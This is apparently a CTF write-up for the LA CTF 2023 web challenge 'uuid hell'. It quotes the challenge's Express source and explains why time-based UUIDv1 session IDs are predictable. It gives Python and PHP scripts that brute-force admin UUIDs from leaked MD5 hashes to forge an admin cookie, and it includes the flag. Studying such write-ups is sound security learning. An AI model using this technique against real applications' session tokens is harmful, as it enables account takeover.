---
Title: uuid hell - LA CTF 2023
Date: 2023-02-15T00:00:00+05:30
Tags: [web, lactf23-writeups, ctf, writeup, hash-collision, uuid]
Categories: [lactf23-writeups,All Writeups]
Authors: [Rohit]
---

#### tl;dr

 - It uses uuidv1 which is time-based
 - We get the user uid from the cookie
 - Then create an admin and get all the current admin hashes as an array from the web page
 - Create another user
 - Brutefoce the first eight bytes of the uuid in the range and check with each hash in the array
 - Use the one that matches

<!--more-->

## Description

UUIDs are the best! I love them (if you couldn't tell)!

- **Author** : burturt
- **Category** : Web
- **Points** : 391
- **Solves** : 165


## Solution

### Understanding the challenge

So the challenge gives us a web page where we can create users and admins. We can also see the list of admin's and user's id hashes (most recent 50 hashes). We can get the regular user's cookie but we can't get the admin cookie we can only create admin users. We can also see the source code for the web page.

```js
const uuid = require('uuid');
const crypto = require('crypto')

function randomUUID() {
    return uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
}
let adminuuids = []
let useruuids = []
function isAdmin(uuid) {
    return adminuuids.includes(uuid);
}
function isUuid(uuid) {
    if (uuid.length != 36) {
        return false;
    }
    for (const c of uuid) {
        if (!/[-a-f0-9]/.test(c)) {
            return false;
        }
    }
    return true;
}

function getUsers() {
    let output = "<strong>Admin users:</strong>\n";
    adminuuids.forEach((adminuuid) => {
        const hash = crypto.createHash('md5').update("admin" + adminuuid).digest("hex");
        output += `<tr><td>${hash}</td></tr>\n`;
    });
    output += "<br><br><strong>Regular users:</strong>\n";
    useruuids.forEach((useruuid) => {
        const hash = crypto.createHash('md5').update(useruuid).digest("hex");
        output += `<tr><td>${hash}</td></tr>\n`;
    });
    return output;

}

const express = require('express');
const cookieParser = require("cookie-parser");

const app = express();
app.use(cookieParser());



app.get('/', (req, res) => {
    let id = req.cookies['id'];
    if (id === undefined || !isUuid(id)) {
        id = randomUUID();
        res.cookie("id", id);
        useruuids.push(id);
    } else if (isAdmin(id)) {
        res.send(process.env.FLAG);
        return;
    }

    res.send("You are logged in as " + id + "<br><br>" + getUsers());
});

app.post('/createadmin', (req, res) => {
    const adminid = randomUUID();
    adminuuids.push(adminid);
    res.send("Admin account created.")
});

app.listen(process.env.PORT);
```

Here we can see that the website uses [uuidv1](https://www.sohamkamani.com/uuid-versions-explained/#v1--uniqueness). UUID V1 is weak as it is based on time and some parts are constant. Only the first 8 bytes are changing.

![constant](images/constant.png)

So we easily brute-force it and get the admin cookie. That's what we thought

### Bruteforcing

So we started making a python script for that. [code](files/exp.py)


```py
import requests
import time
import hashlib
import os
url="https://uuid-hell.lac.tf/"

uuid = requests.get(url).cookies.get_dict()['id']
print(requests.post(url+"createadmin").text)
uuid2 = requests.get(url).cookies.get_dict()['id']

time.sleep(10)
r = requests.get(url).text
admin_hashs = r.split("\n")[1:51]
admin_hashs = list(map(lambda x: x[8:-10],admin_hashs))

print("Length:",len(admin_hashs))
print("Regular UUID:",uuid)
print("Regular UUID2:",uuid2)
os.system("php exp.php "+uuid+" "+','.join(admin_hashs)+" "+uuid2)
```

And for brute-forcing, we used PHP as it will be faster. [code](files/exp.php)

```php
<?php

$uuid = $argv[1];
$admin_hash = $argv[2];
$uuid2 = $argv[3];

$admin_hashs = explode(",", $admin_hash);

$start = hexdec(substr($uuid, 0, 8));
$end = hexdec(substr($uuid2, 0, 8));
$uuid = substr($uuid, 9);
echo "Starting Brute Force... " . $start . " " . $uuid . "\n";
echo "Admin Hash: " . $admin_hash . "\n";

for ($i = $start; $i < $end; $i++) {
    $hash = md5("admin" . dechex($i) . "-" . $uuid);
    echo "Trying: " . dechex($i) . "-" . $uuid . " " . $hash . "\r";
    if (in_array($hash, $admin_hashs)) {
        echo "\nAdmin UUID: " . dechex($i) . "-" . $uuid . "\n";
        break;
    }
}
?>
```

So here we are creating a user first, then we go on and create an admin. After that, we create another user. We then brute force the first 8 bytes of the uuid in the range of the two users. We then check if the hash of the admin uuid matches with any of the admin hashes. If it does we get the admin cookie.


![bruteforce](images/bruteforce.gif)

Setting this as a cookie and visiting the page will give us the flag.


**Flag**: `lactf{uu1d_v3rs10n_1ch1_1s_n07_r4dn0m}`